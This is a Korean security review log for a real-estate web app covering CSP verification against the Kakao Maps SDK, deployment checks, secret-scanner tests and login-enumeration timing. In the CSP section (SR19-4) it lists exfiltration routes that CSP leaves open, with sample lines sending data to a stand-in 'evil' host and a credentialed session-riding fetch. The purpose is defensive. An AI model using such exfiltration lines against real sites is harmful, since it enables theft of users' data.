`SR17-4` **RESOLVED**(`mask_secrets` 신설로 해소) · `SR17-6` **CLOSED**(운영 DB 계정·job 삭제 실측 확인)

### 3단계 security-review 체크리스트 (security.md 7절)

- [x] `user_id` 조건 없는 사용자 자원 쿼리가 없는가 — `get_job(job_id, user_id)` 2인자 유지
- [x] 자산 3종 암호화 저장(평문 컬럼 0) — AAD 바인딩 유지
- [x] `/me/profile`·`/affordability` 본문이 로그에서 제외되는가 — 무변경 + `install_log_masking` 추가
- [x] Claude 프롬프트에 원본 금액이 포함되지 않는가 — 변이 M6 로 실증
- [x] 원시 SQL 문자열 조합이 없는가 — 신규 전수 확인, f-string 2곳은 상수
- [x] `db`·`redis` 에 `ports:` 가 없는가 — compose 무변경 + 서버 실측
- [x] `.env`·키·백업 파일이 커밋되지 않았는가 — 커밋 대상 224파일 × 비밀 6종 실값 대조 **0건**
- [x] 세율·대출한도가 출처·기준일자를 가진 설정인가 — 무변경
- [x] 수집기가 robots·rate limit 을 준수하는가 — 신규 경로 포함 확인
- [x] 포털 소스를 끄고도 서비스가 동작하는가 — 실거래 기준 후보(`price_basis="trade"`)로 오히려 강화

### 판정

**PASS.** SR17-1·SR17-2·SR17-3 이 **구조적으로** 닫혔고, 그 사실을 반례 18종·변이 7종·
실값 스캔(로컬 224 + 서버 222 파일 × 비밀 6종)으로 교차 검증했다. 인증/인가·인젝션·미암호화 전송
결함 0건, 커밋 대상 비밀 유출 0건.

차단하지 않은 대신 **두 가지를 사용자에게 올린다**:

1. **카카오 REST 키 재발급**(+ 미이행 상태인 MOLIT 키 재발급 동시 처리, 2-B 절)
2. **SR18-3** — 유출 비밀번호가 아직 커밋 대상 파일에서 복원된다. 계정이 이미 삭제돼
   동작하는 자격증명은 아니므로 차단하지 않았으나, **그 값을 다른 곳에 재사용한 적이 있다면
   판정은 즉시 뒤집힌다.** push 전 1줄 수정을 권고한다.

---

## SR-019 · 2026-07-26 · **G5 배포 직전 최종 보안리뷰 — SR15-4(CSP) 해소 재검증** (security-reviewer, herdr re-review 대행)

**판정: PASS** — **배포를 막을 보안 사유 없음.** SR15-4 **RESOLVED**.
대상: `deploy/nginx-realestate.conf` · `deploy/DEPLOY.md` · `backend/tests/test_deploy_config.py`(신규) + SR18-3/SEC-3 수정 재확인 + DEC-001 판단
재현: `cd backend && python -m pytest -q` → **661 tests / 0 failures / 54 skipped = 607 passed** (junit 실측, 지시 수치 일치)

> 결론 요약: 담당자가 "카카오맵 SDK 를 실제로 읽고 정했다"고 한 주장을 **내가 SDK 를 직접 내려받아
> 대조했다.** 출처 6개 전부, `eval` 1건, XHR 경로, `cssText` 문자열까지 **문자 단위로 일치**했다.
> 추측으로 적은 출처는 하나도 없다. 나아가 서버 nginx 1.18.0 **격리 인스턴스**로 직접 기동해
> 200/403/502 전 응답에 CSP 가 붙는 것까지 재현했다.
> 다만 CSP 가 "세션 라이딩을 막는다"는 표현은 **과하다**(§1-F) — 실제 기여는 다른 데 있다.
> 그리고 DEC-001 의 보완책 하나(**카카오 JS 키 도메인 제한**)는 **실측 결과 아무것도 막지 않는다**(§4).

---

### 1) CSP 검증 — 담당자 주장을 **원본 대조로** 확인

#### 1-A. SDK 를 직접 내려받아 대조했다

| 받은 것 | 결과 |
|---|---|
| `https://t1.daumcdn.net/mapjsapi/js/main/4.5.13/kakao.js` | HTTP 200 · **104,277 B** |
| `https://t1.daumcdn.net/mapjsapi/js/libs/clusterer/1.1.1/clusterer.js` | HTTP 200 · 10,549 B |
| `https://dapi.kakao.com/v2/maps/sdk.js?appkey=…&libraries=clusterer` (로더) | HTTP 200 · 3,902 B |

#### 1-B. 출처 6개 — **전부 원본에서 확인** (추측 0건)

| CSP 항목 | 담당자 근거 | 내 대조 결과 |
|---|---|:--|
| `script-src dapi.kakao.com` | 로더 sdk.js | `MapView.tsx:38` 이 실제로 이 URL 로 `<script>` 를 붙인다 ✅ |
| `script-src t1.daumcdn.net` | 로더가 붙이는 kakao.js·clusterer.js | 로더 원문: `p={v3:s+"//t1.daumcdn.net/mapjsapi/js/main/4.5.13/kakao.js", clusterer:s+"//t1.daumcdn.net/mapjsapi/js/libs/clusterer/1.1.1/clusterer.js"}` ✅ **정확히 일치** |
| `img-src mts.daumcdn.net` | 타일 `/api/v1/tile/` | 로더 원문: `URI_FUNC.ROADMAP=…"mts.daumcdn.net/api/v1/tile/PNGSD02/v21_a63hc/latest/…"`, `ROADMAP_HD=…"PNG02/v21_qgxnj/…"` ✅ |
| `img-src t1.daumcdn.net` | 마커·컨트롤 스프라이트 | kakao.js: `pa=kc+…"t1.daumcdn.net/mapjsapi/images/"`, `lc=…"t1.daumcdn.net/localimg/localimages/07/mapjsapi/"`. 카카오 로고도 `he=pa+"m_bi_b.png"` ✅ |
| `img-src s1.daumcdn.net` | 범위 밖 빈 타일 | kakao.js: `$e=kc+(Pb?"ssl.daumcdn.net/":"s1.daumcdn.net/")+"dmaps/apis/"` ✅ |
| `style-src 'unsafe-inline'` | SDK 의 cssText·setAttribute('style') | `cssText` **10건**, 그중 `a.style.cssText+="left:0;top:0;width:100%;height:100%;touch-action:none"` 는 주석 인용문과 **문자 단위로 동일**. `setAttribute("style", …)` **2건**(SVG 마커 화살표) ✅ |

세 img 출처는 **실제 도달성까지** 확인했다 — 셋 다 `200 image/png`:
`mts…/tile/PNGSD02/v21_a63hc/latest/3/1/1.png` · `t1…/mapjsapi/images/m_bi_b.png` · `s1…/dmaps/apis/white.png`.

#### 1-C. `'unsafe-eval'` 제외 — **주장 정확**

kakao.js 전체에서 `eval(` 은 **정확히 1건**이고, 그 1건이 바로:
```js
try{eval("document.namespaces")}catch(vf){}
```
**상수 문자열**이라 동적 코드 실행이 아니고, `try/catch` 안이라 차단돼도 진행된다.
DEPLOY.md §5-5(4) 표가 "이 위반 1건은 정상이며 이걸 보고 `'unsafe-eval'` 을 넣지 말라"고 못박은 것도 정확하다.
`new Function` 0건 · `document.write` 0건(로더는 `autoload=false` 라 write 경로를 타지 않는다) — 확인.

#### 1-D. `connect-src 'self'` — **주장 정확**

kakao.js 의 `XMLHttpRequest` 3건을 전부 열어 봤다:
- 1건은 `Bb=gb&&!O.XMLHttpRequest` — **기능 탐지**(요청 아님)
- 2건은 **같은 호출부**(로드뷰 `street_view` 검색, `tf=Pb?"https://ssl.daumcdn.net/map2/map/":"https://spi.map.kakao.com/map2/map/"`)

→ **실제 네트워크 호출부는 1개뿐이고 로드뷰 전용**이다. clusterer.js 는 `XMLHttpRequest`·`fetch` **0건**.
기본 지도 + clusterer 가 XHR 을 하지 않는다는 주장은 사실이다.

#### 1-E. **제외한** 출처가 옳게 제외됐나 (최소권한 반대 방향 검사)

SDK 원문에서 발견되지만 CSP 에 **없는** 호스트를 전부 추적했다 — 전부 **미사용 기능**이라 제외가 옳다:

| 호스트 | 무엇 | 제외 타당성 |
|---|---|:--|
| `ctt-image.kakao.com` | `URI_FUNC.TRAFFIC/TRAFFIC_HD` 교통정보 타일 | 교통 레이어 미사용 ✅ |
| `map0~3.daumcdn.net` | `"map"+(a&3)+".daumcdn.net/map_skyview/L…"` 스카이뷰 타일 | 스카이뷰 미사용(코드에 `MapTypeId`·`setMapTypeId`·`MapTypeControl` **0건**) ✅ |
| `ssl.daumcdn.net` | `Pb = kakao.maps.TUNNELING` 이 켜졌을 때만 타는 분기 | `TUNNELING` 을 설정하지 않으므로 기본 off ✅ |
| `rv.map.kakao.com` · `spi.map.kakao.com` | 로드뷰 데이터/타일 | 로드뷰 미사용 ✅ |
| `map.kakao.com` | 로고 `<a href>`·"카카오맵에서 보기" 링크 | **CSP 대상 아님**(문서 이동은 어떤 지시어도 통제하지 않는다) ✅ |
| `www.w3.org` | `createElementNS` SVG 네임스페이스 문자열 | 네트워크 요청 아님 ✅ |

**결론: 출처 목록은 과하지도 부족하지도 않다.** 최소권한이 맞다.

#### 1-F. ★ 그런데 "CSP 가 세션 라이딩을 막는다"는 **과한 표현이다** (SR19-4, info)

지시 1번 질문에 정직하게 답한다. **`connect-src 'self'` 는 세션 라이딩을 막지 못한다.**

- 세션 라이딩의 본체는 `fetch('/api/v1/me/profile', {credentials:'include'})` 인데 이건 **같은 오리진**이다.
  `connect-src 'self'` 는 이것을 **허용**한다. CSP 로는 원리상 막을 수 없다.
- `X-Requested-With` 요구(SR-016)도 도움이 안 된다 — 주입된 스크립트는 헤더를 그냥 붙이면 된다.
  그건 고전적 CSRF 방어지 XSS 방어가 아니다.

**CSP 의 실제 기여는 다른 데 있다**: `script-src 'self' + 2개 출처`에 `'unsafe-inline'`·`'unsafe-eval'` 이
**둘 다 없으므로**, 주입된 인라인 스크립트·`onerror=` 핸들러·`javascript:` URL·`eval` 이 **애초에 실행되지 않는다.**
즉 CSP 는 "라이딩을 막는" 게 아니라 "**라이딩할 코드가 돌지 못하게** 한다". 이 구분은 중요하다 —
전자로 적어 두면 다음 사람이 CSP 를 믿고 다른 층을 소홀히 한다.

그리고 스크립트가 어떻게든 돌았다고 가정하면, **CSP 가 못 막는 반출 경로가 남는다**:

| 경로 | 차단? | 비고 |
|---|:--:|---|
| `fetch`/XHR/WebSocket/`sendBeacon`/`<a ping>` 외부 전송 | **차단** | `connect-src 'self'` 가 실제로 일하는 지점 |
| CSS `background:url(https://evil/…)` | **차단** | `img-src` 가 'self'+카카오3 뿐 |
| `@import` 외부 스타일 · 외부 폰트 | **차단** | `style-src 'self'` · `font-src 'self'` |
| `<object>`/`<embed>` · `<base>` 하이재킹 · 폼 탈취 · 프레임 삽입 | **차단** | `object-src 'none'` · `base-uri 'none'` · `form-action 'self'` · `frame-ancestors 'none'` |
| **`location.href = 'https://evil/?d='+data` · `window.open`** | ❌ **안 막힘** | `navigate-to` 지시어는 표준에서 빠져 브라우저에 없다 |
| **WebRTC `RTCPeerConnection`** | ❌ **안 막힘** | CSP 에 해당 지시어가 아예 없다 |

→ 배포 차단 사유는 아니다(CSP 사양 자체의 한계라 우리가 고칠 수 없다).
**조치(info)**: `nginx-realestate.conf` 주석과 `test_deploy_config.py` 독스트링의
"CSP 가 세션 라이딩을 막는다" 표현을 "**주입 코드의 실행을 막아** 세션 라이딩에 이르지 못하게 한다"로 정정.

**이 앱의 실제 XSS 표면은 매우 좁다** — 그래서 CSP 는 진짜로 '2선'이다:
프론트 전체에 `innerHTML`·`dangerouslySetInnerHTML`·`insertAdjacentHTML`·`eval`·`new Function`·
`document.write` **사용 0건**(주석으로만 언급). 서버 문자열이 DOM 에 닿는 유일한 경로
(`mapMarkers.ts` 라벨)는 `row.textContent = line` 이고, 스타일 문자열에 서버 데이터를 넣는 지점도 0건이다.

#### 1-G. `style-src 'unsafe-inline'` 은 수용 가능한가 — **가능하다** (지시 2번)

- **필요성 실증**: 위 1-B 대로 SDK 가 `cssText`(10건)·`setAttribute("style")`(2건)를 쓴다. 빼면 지도가 무너진다.
  DEPLOY.md 가 "Report-Only 상태에서만 빼 보고 위반이 없으면 빼도 된다"는 재확인 절차까지 남긴 것은 적절하다.
- **위험도가 낮은 이유** — CSS 주입의 실질 피해는 대부분 **외부 로딩을 통한 반출**인데 그 경로가 전부 닫혀 있다:
  `img-src`(배경이미지) · `font-src`(폰트) · `style-src`(`@import`) 가 모두 'self'(+카카오 이미지 3) 뿐이다.
- **주입 지점도 없다**: 우리 코드가 스타일 문자열을 서버 데이터로 조립하지 않는다(위 1-F 실측).
- 무엇보다 `script-src` 는 조여 있다 — `style-src` 의 `'unsafe-inline'` 은 `script-src` 의 그것과 **위험도가 다르다**.

---

### 2) 배포 절차 (지시 4번) — **안전하다**

| 항목 | 확인 |
|---|:--|
| 순서 | 부트스트랩(HTTP 전용) → `certonly --webroot` → 본설정+**Report-Only** → 브라우저 확인 → 강제 → 갱신 확인 |
| `--nginx` 미사용 | ✅ 동거 서비스 설정 자동수정 위험을 피한 판단이 옳다 |
| 모든 reload 앞에 `nginx -t` | ✅ 실패 시 "손으로 고치지 말고 되돌린 뒤 보고" 명시 |
| Report-Only 치환 검증 | ✅ `grep -c` 가 **3** 이 아니면 진행 금지 (블록 3개와 일치) |
| 강제 전환 방식 | ✅ sed 를 되돌리는 게 아니라 **저장소 원본을 다시 복사**(원본이 강제 상태) → 되돌림 실수 구조적 차단, `grep -c … = 0` 검증 |
| **되돌리기 경로** | ✅ 2개 — (a) Report-Only 재적용((3)으로) (b) `rm /etc/nginx/sites-enabled/realestate.conf` + reload |
| `report-uri` 없음 | 수용 — 수집 엔드포인트 부재 + 디스크 87% + 1인 서비스. 대신 §5-5(4)가 **브라우저 콘솔 육안 확인**을 절차로 강제 |

**내가 직접 재현했다** — 서버 nginx 1.18.0 **격리 인스턴스**(임시 prefix·자체 pid/log·`127.0.0.1:18443`),
`/etc/nginx` 및 동거 서비스 **무변경**(사후 `sites-enabled` 목록 동일 확인), 임시물 전량 삭제:

```
(1) nginx -t (강제판)      → syntax is ok / test is successful
(2) Report-Only 치환       → 3건, nginx -t 도 통과
(3) 격리 기동 후 응답별 헤더:
    403  CSP=1  보안헤더5종중=5  /
    403  CSP=1  보안헤더5종중=5  /index.html
    403  CSP=1  보안헤더5종중=5  /assets/a.css
    502  CSP=1  보안헤더5종중=5  /api/v1/health
    403  CSP=1  보안헤더5종중=5  /nope-404
```
**오류 응답(403·502)에도 CSP 가 정확히 1개씩** 붙는다 — `always` 가 실제로 동작함을 실측했다.
CSP 값이 `map` 하나에서 오므로 세 블록의 값이 갈라질 수 없다는 설계도 확인된다.

---

### 3) `test_deploy_config.py` 자기충족성 (지시 5번) — 변이 18종 중 **16종 탐지**

| 변이 | 탐지 |
|---|:--:|
| M1 CSP 헤더를 한 블록에서 제거 | ✅ 2건 FAIL |
| M2 `'unsafe-eval'` 추가 / M3 `'unsafe-inline'` 추가(script) | ✅ |
| M4 `always` 제거 | ✅ 2건 |
| M5 한 블록만 값 하드코딩(변수 참조 깨기) | ✅ |
| M6 `mts.daumcdn.net` 제거 / M7 `t1.daumcdn.net` 제거 / M8 style `'unsafe-inline'` 제거 | ✅ |
| M9 `connect-src *` / M10 `connect-src` 에 외부 출처 추가 | ✅ |
| M13 `frame-ancestors 'self'` / M14 `base-uri` 제거 / M15 `object-src 'self'` / M16 `default-src *` | ✅ |
| M17 `check_headers()` 에서 CSP 제거 / M18 Report-Only 절차 삭제 | ✅ |
| **M11 `script-src` 에 `https://cdn.jsdelivr.net` 추가** | ❌ **미탐지** |
| **M12 `img-src` 에 `data:` 추가** | ❌ **미탐지** |

**SR19-2 (low)**: 테스트는 "필요한 출처가 **있는가**"만 본다. **집합이 정확한가**는 아무도 안 본다.
그래서 출처를 **좁히는**(지도가 죽는) 실수는 전부 잡지만, **넓히는**(방어가 새는) 변경은 통과한다.
`script-src` 는 이 CSP 방어의 핵심이라 이 방향이 더 위험하다.
**조치**: 지시어별 **정확한 집합 일치**를 단언하는 테스트 1건 추가
(`set(_directive("script-src")) == {"'self'", "https://dapi.kakao.com", "https://t1.daumcdn.net"}`).
원복 후 재실행 0 FAIL 확인. 변이에 쓴 두 파일은 **바이트 단위로 원복**했다(LF 유지 확인).

---

### 4) ★ 카카오 JS 키 도메인 제한이 **실효가 없다** (SR19-1, medium · DEC-001 정정 필요)

DEC-001 이 보완책으로 기록한 "카카오 JS 키: 허용 도메인 제한 등록(realestate.utilverse.info, 사용자 완료)"을
**실측으로 검증했다.** 12:44 와 12:51 두 번, 결과 동일:

| 요청 | 결과 |
|---|:--|
| `Referer` **없음** | **HTTP 200** — SDK 본문 정상 반환 (**내 PC 에서**) |
| `Referer: https://realestate.utilverse.info/` | **HTTP 401** `{"errorType":"AccessDeniedError","message":"domain mismatched! caller=https://realestate.utilverse.info. check out registered web domains."}` |
| `Referer: http://realestate.utilverse.info` · `https://utilverse.info` · `http://localhost:5173` | 전부 **401** |

**두 가지가 동시에 사실이다:**

1. **등록된 허용목록에 운영 도메인이 없다.** 카카오가 우리 도메인을 이름까지 찍어 "mismatched" 라고 답한다.
2. **그런데도 지도는 뜬다** — 우리 nginx 가 `Referrer-Policy: no-referrer` 를 주므로 브라우저가
   SDK 요청에 Referer 를 **안 싣고**, 카카오는 Referer 가 없으면 통과시킨다(위 200).

따라서:

- **(a) 보완책이 아무것도 막지 않는다.** 내가 내 PC 에서 우리 키로 200 을 받았다.
  누구든 `no-referrer` 로 요청하면 우리 키를 쓸 수 있다 → DEC-001 이 수용한 잔여위험
  (**한도 소진**)이 이 통제로 줄어들지 않는다. 기록을 정정해야 한다.
- **(b) 숨은 결합이 생겼다.** 지금 지도가 사는 이유가 `no-referrer` 다. 누군가 보안을 "개선"하려고
  `Referrer-Policy` 를 `strict-origin-when-cross-origin` 등으로 바꾸면 **그 순간 지도가 죽는다.**
  아무도 그 인과를 모르는 상태로 남으면 안 된다.

**배포 차단은 아니다** — 피해 상한이 DEC-001 이 이미 수용한 "한도 소진"과 동일하고, 우리 데이터·세션과
무관하다. 다만 **사용자가 이 보완책을 근거의 하나로 삼아 위험을 수용했으므로 반드시 알려야 한다.**

**조치**: ① 카카오 개발자 콘솔에서 웹 플랫폼 도메인에 `https://realestate.utilverse.info` 가 실제로
등록됐는지 재확인(오타·다른 앱에 등록 가능성) ② 등록이 끝나도 `no-referrer` 우회는 남으므로
DEC-001 의 보완책 목록에서 이 항목의 실효성을 **하향 기재** ③ `Referrer-Policy` 와 지도 동작의
결합을 `nginx-realestate.conf` 주석에 1줄 남길 것.

**DEC-001 자체 판단: 배포 차단 사유 아님.** 두 키 모두 조회 전용, 최대 피해는 일일 한도 소진,
사용자 명시 결정 + 재검토 조건 기재. 보완책 4개 중 **3개(마스킹 · gitignore+600 · 위생 테스트)는
내가 실동작을 확인**했고, 1개(도메인 제한)만 위와 같이 무효다.

---

### 5) SR18-3 / SEC-3 재확인 (지시 6번) — **해소**

- **유출값 저장소 전수 0건**: `Recommend-2026`·`verify-Recommend` 로 `.git` 제외 전 파일 검색 → **0건**
  (리뷰 로그 인용본 포함 제거 확인).
- **형태 기반 검사기로 교체 확인**: 특정 값을 쫓지 않고 `_SECRET_ASSIGN` 패턴으로 형태를 본다.
  `[a-z_]*(password|…)` 로 `TEST_PASSWORD` 같은 **접두사 이름**까지 잡도록 고친 것도 확인.
- **SEC-3(`fullmatch`) 수정 실효 확인** — 진짜 유출 7종을 문서에 심어 재현:

| 심은 것 | 잡혔나 |
|---|:--:|
| `TEST_PASSWORD` 상수에 특수문자 섞인 20자 값 대입 | ✅ |
| MOLIT 인증키 형태(base64 88자, `%2B`·`%3D` 포함) | ✅ |
| 카카오 REST 키 형태(32자 hex) | ✅ |
| `POSTGRES_PASSWORD=` 형태로 특수문자 섞인 20자 값 인라인 | ✅ |
| **SEC-3 회귀①** 진짜 키 안에 `test` 가 우연히 포함 | ✅ **잡힘** |
| **SEC-3 회귀②** 진짜 비밀번호에 `sample` 포함 | ✅ **잡힘** |
| **산문 인용**: "계정 비밀번호는 `<SR17-2 유출값>` 였다" 형태(구분자 `=`·`:` 없음) | ❌ **놓침** |

자리표시자 3종(`EXAMPLE_KEY_1234`, `<채워넣기>`, 환경변수 이름만 언급)은 **정상적으로 면제** — 오탐 0.

> **덤으로 실전 검증이 됐다.** 이 SR-019 초안에 위 표를 쓰면서 예시 값을 그럴듯한 형태로 적었더니
> `test_docs_and_config_do_not_contain_secret_values` 가 **내 리뷰 로그 2줄을 즉시 잡아냈다**
> (`security-review-log.md:2322`, `:2325`). 검사기가 리뷰어 자신의 문서에도 실제로 작동한다는
> 뜻이다 — SR17-2 가 바로 '리뷰 로그가 값을 인용해 유출된' 사고였으므로 정확히 맞는 그물이다.
> 해당 두 줄은 값을 적지 않는 서술로 고쳤다.

**SR19-3 (low)**: 마지막 1종을 놓친다. `_SECRET_ASSIGN` 이 `이름 [=:] 값` 형태를 요구하는데,
한국어 산문("계정 비밀번호는 `…` 였다")에는 그 구분자가 없다. **하필 이것이 SR17-2 의 원래 형태다** —
리뷰 로그가 결함을 설명하려고 값을 인용한 그 모습. 즉 교체로 **일반성은 얻고 원래 사례는 놓쳤다.**
현재 실제 위반은 0건이라 비차단.
**조치**: 형태 검사를 유지하되 **알려진 유출값의 `sha256` 지문 목록**을 함께 두고 대조한다
(평문을 저장소에 남기지 않으면서 특정 값도 잡힌다 — SR-018 이 권고한 형태). 한국어 키워드
(`비밀번호`·`인증키`)를 `_SECRET_ASSIGN` 에 추가하는 것도 값싸다.

---

### 6) 그 밖에 배포를 막을 보안 사유가 있나 (지시 7번) — **없다**

| 항목 | 상태 |
|---|:--|
| 보안 관련 테스트 190건(`test_deploy_config`·`test_script_hygiene`·`test_masking`·`test_security`·`test_api`·`test_agents`) | **0 fail** |
| DB 포트 미개방 | ✅ 서버 `ss -tlnp` 에 5432 리스너 **0**, `realestate-db-1` Ports 공란 |
| `.env` 권한 | ✅ 600 root:root |
| 비밀값 커밋 유출 | ✅ SR-018 에서 전수 0건 · 이번 라운드 유출값 재검색 0건 |
| IDOR · SR4-2 · 필드 암호화 | ✅ SR-018 확인분 무변경(관련 테스트 통과) |
| 동거 서비스 | ✅ `itsmine-*`·`autobtc` **조회·격리검증만** — 중지·재시작·설정변경 **0회**, `/etc/nginx` 무변경 |

**비보안 관찰 2건(참고)**

1. **리뷰 중 트리가 움직였다.** 시작 시점엔 지시대로 607 passed/54 skipped 였는데, 12:53 경
   다른 작업(`backend/app/ingest/geocode.py`·`frontend/src/lib/mapMarkers.ts` — GEO-7 스윕)이
   들어오며 전체 스위트가 일시적으로 **red**(1건 → 다른 2건)였다가 12:55 에 **green 복귀**
   (661 tests / 0 fail / 54 skip = 607 passed). 보안 관련 190건은 전 구간 0 fail 이었다.
   → G5 는 "**이 트리를** 배포"하는 행위다. **배포 직전 트리 동결 + 최종 그린 1회 확인**을 권고한다.
2. `GEO-7`(medium, `blocks: G5 배포 전 필수`)이 아직 OPEN 이다 — 좌표 정확성 문제라
   **보안 판정 대상이 아니다.** 코드리뷰 소관이며, 배포 전 그쪽 판단이 필요하다.

**미사용 서드파티 스크립트(SR19-5, info)**: `MapView.tsx` 가 `libraries=clusterer` 로 clusterer.js
(10.5KB)를 받지만, 프론트에서 `MarkerClusterer` 를 **한 번도 쓰지 않는다**(자체 클러스터링 사용 —
저장소 전수 grep 결과 `clusterer` 언급은 로더 URL 1줄뿐). CSP 는 넓어지지 않지만(같은 `t1.daumcdn.net`)
불필요한 외부 스크립트를 1개 덜 실행하는 편이 낫다 → `&libraries=clusterer` 제거 검토.

---

### 신규 발견 요약

| ID | 심각도 | 제목 | 차단 |
|---|:--:|---|:--:|
| `SR19-1` | **medium** | 카카오 JS 키 도메인 제한이 실효 없음 — 운영 도메인이 허용목록에 없고, `no-referrer` 요청은 통과. DEC-001 보완책 기록 정정 필요 + `Referrer-Policy` 와 지도 동작의 숨은 결합 | 비차단 |
| `SR19-2` | low | `test_deploy_config.py` 가 CSP 출처를 **넓히는** 변경을 못 잡는다(변이 M11·M12 미탐지) | 비차단 |
| `SR19-3` | low | 새 위생 검사기가 **산문에 인용된 비밀**을 놓친다 — 하필 SR17-2 의 원래 형태 | 비차단 |
| `SR19-4` | info | "CSP 가 세션 라이딩을 막는다" 표현 과장 — 실제 기여는 주입 코드의 **실행 차단**. navigation·WebRTC 반출은 CSP 사양상 못 막음 | 비차단 |
| `SR19-5` | info | `libraries=clusterer` 를 받지만 `MarkerClusterer` 미사용 | 비차단 |

### CLOSE 처리

`SR15-4` **RESOLVED** (CSP 도입·검증 완료 — 원본 대조 + 격리 nginx 실측) ·
`SR18-3` **RESOLVED** (유출값 저장소 0건 + 형태 기반 검사기 실효 확인) ·
`SEC-3` **RESOLVED** (`fullmatch` 수정, 회귀 2케이스 모두 탐지)

### 판정

**PASS — 배포를 막을 보안 사유 없음. `deploy_approved: true`** (아래 2가지 확인 후 실행 권고)

SR15-4 는 "헤더를 붙였다"가 아니라 **"왜 이 출처인지"를 원본으로 증명한** 드문 수준의 작업이다.
담당자의 SDK 확인 주장은 **하나도 빠짐없이 사실**이었고, 최소권한 방향(과함·부족함) 양쪽에서 검증했다.
절차도 Report-Only 선행 · `nginx -t` 게이트 · 되돌림 2경로로 안전하다.

**실행 전 확인 2건(보안 차단 아님, 운영 판단)**
1. **트리 동결 후 최종 그린 1회** — 리뷰 중 다른 작업이 들어와 스위트가 일시 red 였다(§6).
2. **`GEO-7`** — 코드리뷰 소관의 좌표 정확성 항목이 `G5 배포 전 필수`로 열려 있다.

**사용자에게 올릴 것**: `SR19-1` — DEC-001 의 보완책 "카카오 JS 키 도메인 제한"은 **실측상 아무것도
막지 않는다.** 위험 수용 결정 자체는 유효하지만(피해 상한 = 한도 소진), 결정의 근거 하나가 사실과
다르므로 기록을 정정하고 콘솔 등록 상태를 재확인해야 한다.

---

## SR-020 · 2026-07-26 · **배포 직전 최종 — 가입 승인제(ADM-1/2) · 제외 사유 평문 저장(REC-3) · 수집(INGEST-3)** (security-reviewer, herdr re-review 대행)

**판정: PASS** — **배포를 막을 보안 사유 없음.** 단 **선결 조건 1건(SR20-1, 취약점 아님)**을 반드시 지킬 것.
대상: SR-019 이후 working tree 전체 — `migrations/009·010` · `app/api/**` · `app/repositories/**` · `app/core/security.py` · `scripts/manage_users.py` · 프론트 관리자 화면 · `app/ingest/**`
재현: backend **727 tests / 0 failures / 63 skipped = 664 passed** · frontend **16 files / 190 passed** — 지시 수치 일치

> 결론 요약: 이번 라운드의 핵심은 **새 인증 경로를 만들면서 기존 열거 취약점(SR10-1)까지 닫았다**는 것이다.
> 주장을 믿지 않고 **직접 측정했다** — 없는 계정과 있는 계정의 응답 시간 차가 argon2 1회 비용의 **2.2%**
> 까지 줄었고, 네 가지 실패 케이스의 응답은 바이트 단위로 같다. 권한 모델도 토큰에 권한을 싣지 않고
> 웹에 권한 부여 경로 자체를 두지 않아 **상승 경로가 구조적으로 없다.**
> 다만 **운영 DB에 009가 아직 적용돼 있지 않고**(실측), 서버에 손으로 넣은 임시 차단 블록이
> **DEP-1 결함을 그대로 재현**하고 있다(라이브 실측). 둘 다 이번 배포 절차로 해소된다.

---

### 1) ★ 계정 열거(SR10-1) — **측정으로 닫힘을 확인**

지시대로 "구조로 확인"에 그치지 않고 **직접 측정**했다(InMemory 리포지토리 + TestClient, N=25).

#### 1-A. 응답 동일성 — 네 경우가 **완전히 같다**

| 케이스 | 응답 |
|---|---|
| 없는 계정 + 아무 비밀번호 | `401 {"detail":{"code":"UNAUTHORIZED","message":"이메일 또는 비밀번호가 올바르지 않습니다"}}` |
| 있는 계정(승인) + 틀린 비밀번호 | 동일 |
| 있는 계정(**대기**) + 틀린 비밀번호 | 동일 |
| 있는 계정(**거부**) + 틀린 비밀번호 | 동일 |

상태코드·본문·헤더 집합까지 대조 → **완전 동일**. 승인 상태가 401 응답에 새지 않는다.

#### 1-B. 타이밍 — 오라클이 실제로 사라졌다

```
없는 계정 + 아무 비번     median= 26.78ms   mean= 27.34   min= 26.20  max= 30.02
있는(승인) + 틀린 비번    median= 27.25ms   mean= 27.33   min= 26.05  max= 29.76
있는(대기) + 틀린 비번    median= 27.56ms   mean= 28.04
있는(거부) + 틀린 비번    median= 27.13ms   mean= 27.63

없는계정 vs 있는계정 중앙값 차 : 0.48ms
argon2 해시 1회 실측 비용      : 21.59ms
==> 차이는 argon2 1회 비용의 2.2%
```

이 수치의 의미: **수정 전이라면 이 자리에 약 22ms(=100%)의 차이**가 났다. 없는 계정은 argon2를
아예 돌리지 않고 즉시 401을 냈기 때문이다. 지금은 없는 계정에도 같은 비용을 태워 그 신호가 사라졌다.
0.48ms는 분포 폭(min~max 약 4ms) 안에 완전히 묻히는 크기다.

#### 1-C. 구조도 맞다

`dummy_password_hash()` 가 `hash_password()` 를 그대로 쓰므로 **파라미터가 같을 수밖에 없다**
(별도 상수를 두었다면 파라미터가 갈라질 여지가 있었다). `functools.lru_cache(maxsize=1)` 로
프로세스당 1회만 계산되고, 값은 `secrets.token_urlsafe(32)` 라 어떤 비밀번호와도 일치하지 않는다.

검사 **순서**도 옳다 — `verify_password` 를 먼저 돌리고, 실패면 401. 승인 상태는 그 뒤에만 본다:

| 올바른 비밀번호로 로그인 | 응답 |
|---|---|
| 승인됨 | `200` + access_token |
| 대기 | `403 {"code":"PENDING_APPROVAL"}` |
| 거부 | `403 {"code":"ACCOUNT_REJECTED"}` |

403을 볼 수 있는 사람은 **이미 그 계정의 비밀번호를 아는 사람**뿐이라 열거로 이어지지 않는다.
순서를 뒤집었다면 승인제가 오히려 "누가 가입 대기 중인지"를 알려주는 장치가 됐을 것이다.

#### 1-D. 프론트도 구조로 보장한다

`lib/authMessages.ts::loginFeedback` 이 **401을 가장 먼저** 분기하고 그 안에서
**서버의 `code`·`message` 를 읽지도 않는다** — 단일 상수 `LOGIN_FAILED_MESSAGE` 로 끝낸다.
뒤에 어떤 분기를 추가해도 401은 거기 닿지 못한다. 문구 규칙을 뷰에서 떼어내 한 파일로 모은 판단도 옳다
(컴포넌트 안에 흩어 두면 다음 사람이 "친절하게" 세분화하다 구멍을 연다).

#### 1-E. 잔여: `register` 의 409 `EMAIL_TAKEN` (SR20-4, low — **수용 가능**)

가입 여부 오라클은 남는다. 그러나 수용 가능하다고 본다:
- **가치 있는 오라클(로그인)은 닫혔다.** 남은 것은 "가입돼 있다"까지이고 그 이상은 알 수 없다.
- **알아내도 쓸 수 없다** — 승인 없이는 로그인이 불가능하고, 관리자 부여 경로는 웹에 없다.
- **속도 제한이 걸린다** — `location ~ ^/api/v1/auth/(login|register)$` → `re_auth` 1r/s · burst 5.
- 대안(항상 202를 주고 메일로 통지)은 **메일 인프라가 없는 1~2인 서비스**에서 현실성이 없고,
  중복 가입을 조용히 삼키면 사용자가 영문 모른 채 승인을 기다리게 된다.

---

